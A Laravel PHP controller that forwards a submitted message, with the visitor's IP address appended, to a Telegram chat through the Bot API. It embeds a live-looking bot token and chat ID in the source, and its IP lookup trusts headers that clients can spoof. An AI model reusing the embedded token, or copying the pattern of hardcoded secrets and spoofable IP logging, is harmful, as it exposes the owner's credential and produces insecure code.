<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Http;

class telegram extends Controller
{

    private $botToken = '7085757090:AAEcRyJWo9tDtLMRC17YKaPB-71-aEzp2-g'; // Your bot token
    private $chatId = '5661281308';

    public function sendMessage(Request $data){
        function getUserIP() {
            if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
                // Check if the IP is passed from a shared internet connection
                return $_SERVER['HTTP_CLIENT_IP'];
            } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
                // Check if the IP is passed from a proxy
                return $_SERVER['HTTP_X_FORWARDED_FOR'];
            } else {
                // Get the IP address from the remote address
                return $_SERVER['REMOTE_ADDR'];
            }
        }
        $textMessage = $data->input('message');
        Http::post("https://api.telegram.org/bot{$this->botToken}/sendMessage", [
            'chat_id' => $this->chatId,
            'text' => $textMessage.'ip:'.getUserIp(),
        ]);
        return response()->json(['status'=>200]);
    }
}
